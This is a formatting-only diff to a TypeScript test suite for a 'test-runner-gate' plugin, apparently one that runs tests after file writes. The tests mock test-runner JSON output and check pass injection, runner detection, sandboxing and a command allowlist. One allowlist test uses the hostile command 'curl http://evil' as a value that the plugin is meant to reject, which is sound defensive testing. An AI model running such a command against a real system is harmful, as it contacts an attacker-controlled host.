@@ -22,26 +22,30 @@ function defaultExecFileImpl(
     args.includes('--reporter') ||
     (args.includes('json') && joined.includes('reporter'))
   ) {
-    callback(null, JSON.stringify({
-      numTotalTests: 3,
-      numPassedTests: 2,
-      numFailedTests: 1,
-      success: false,
-      testResults: [
-        {
-          assertionResults: [
-            { status: 'passed', title: 'test A' },
-            { status: 'passed', title: 'test B' },
-            {
-              status: 'failed',
-              title: 'test C',
-              fullName: 'test C',
-              failureMessages: ['Expected 1 got 2'],
-            },
-          ],
-        },
-      ],
-    }), '');
+    callback(
+      null,
+      JSON.stringify({
+        numTotalTests: 3,
+        numPassedTests: 2,
+        numFailedTests: 1,
+        success: false,
+        testResults: [
+          {
+            assertionResults: [
+              { status: 'passed', title: 'test A' },
+              { status: 'passed', title: 'test B' },
+              {
+                status: 'failed',
+                title: 'test C',
+                fullName: 'test C',
+                failureMessages: ['Expected 1 got 2'],
+              },
+            ],
+          },
+        ],
+      }),
+      '',
+    );
     return;
   }
   callback(null, '', '');
@@ -118,7 +122,9 @@ interface MockApi {
   session: { append: ReturnType<typeof vi.fn> };
 }
 
-function makeApi(overrides: { extensions?: Record<string, unknown>; enabled?: boolean } = {}): MockApi {
+function makeApi(
+  overrides: { extensions?: Record<string, unknown>; enabled?: boolean } = {},
+): MockApi {
   return {
     tools: { register: vi.fn() },
     config: {
@@ -243,19 +249,25 @@ describe('pass injection', () => {
         return;
       }
       if (args.includes('--reporter=json') || args.includes('--json')) {
-        callback(null, JSON.stringify({
-          numTotalTests: 3,
-          numPassedTests: 3,
-          numFailedTests: 0,
-          success: true,
-          testResults: [],
-        }), '');
+        callback(
+          null,
+          JSON.stringify({
+            numTotalTests: 3,
+            numPassedTests: 3,
+            numFailedTests: 0,
+            success: true,
+            testResults: [],
+          }),
+          '',
+        );
         return;
       }
       callback(null, '', '');
     });
 
-    const api = makeApi({ extensions: { 'test-runner-gate': { enabled: true, injectOnPass: true } } });
+    const api = makeApi({
+      extensions: { 'test-runner-gate': { enabled: true, injectOnPass: true } },
+    });
     await testRunnerGatePlugin.setup(api as never);
     const hook = getHook(api);
     const result = await hook({
@@ -273,13 +285,17 @@ describe('pass injection', () => {
         return;
       }
       if (args.includes('--reporter=json') || args.includes('--json')) {
-        callback(null, JSON.stringify({
-          numTotalTests: 3,
-          numPassedTests: 3,
-          numFailedTests: 0,
-          success: true,
-          testResults: [],
-        }), '');
+        callback(
+          null,
+          JSON.stringify({
+            numTotalTests: 3,
+            numPassedTests: 3,
+            numFailedTests: 0,
+            success: true,
+            testResults: [],
+          }),
+          '',
+        );
         return;
       }
       callback(null, '', '');
@@ -366,13 +382,17 @@ describe('runner detection + config', () => {
         args.includes('--json') ||
         args.includes('--reporter json')
       ) {
-        callback(null, JSON.stringify({
-          numTotalTests: 1,
-          numPassedTests: 1,
-          numFailedTests: 0,
-          success: true,
-          testResults: [],
-        }), '');
+        callback(
+          null,
+          JSON.stringify({
+            numTotalTests: 1,
+            numPassedTests: 1,
+            numFailedTests: 0,
+            success: true,
+            testResults: [],
+          }),
+          '',
+        );
         return;
       }
       callback(null, '', '');
@@ -435,7 +455,10 @@ describe('sandbox + custom-command allowlist', () => {
     // no test execution for an outside path.
     expect(
       mockExecFile.mock.calls.some(
-        (c) => Array.isArray(c[1]) && !(c[1] as string[]).includes('--version') && !(c[1] as string[]).includes('--reporter'),
+        (c) =>
+          Array.isArray(c[1]) &&
+          !(c[1] as string[]).includes('--version') &&
+          !(c[1] as string[]).includes('--reporter'),
       ),
     ).toBe(false);
   });
@@ -453,7 +476,9 @@ describe('sandbox + custom-command allowlist', () => {
   });
 
   it('rejects a custom command whose first token is not on the allowlist', async () => {
-    const api = makeApi({ extensions: { 'test-runner-gate': { enabled: true, command: 'curl http://evil' } } });
+    const api = makeApi({
+      extensions: { 'test-runner-gate': { enabled: true, command: 'curl http://evil' } },
+    });
     await testRunnerGatePlugin.setup(api as never);
     const hook = getHook(api);
     // Expect the hook to run a normal write (resolves a test file) but the
@@ -512,8 +537,7 @@ describe('extension filter + content-hash cache', () => {
   function vitestCallsCount(): number {
     return mockExecFile.mock.calls.filter(
       (c: unknown[]) =>
-        Array.isArray(c[1]) &&
-        (c[1] as string[]).some((a) => a === 'run' || a === 'vitest'),
+        Array.isArray(c[1]) && (c[1] as string[]).some((a) => a === 'run' || a === 'vitest'),
     ).length;
   }
 
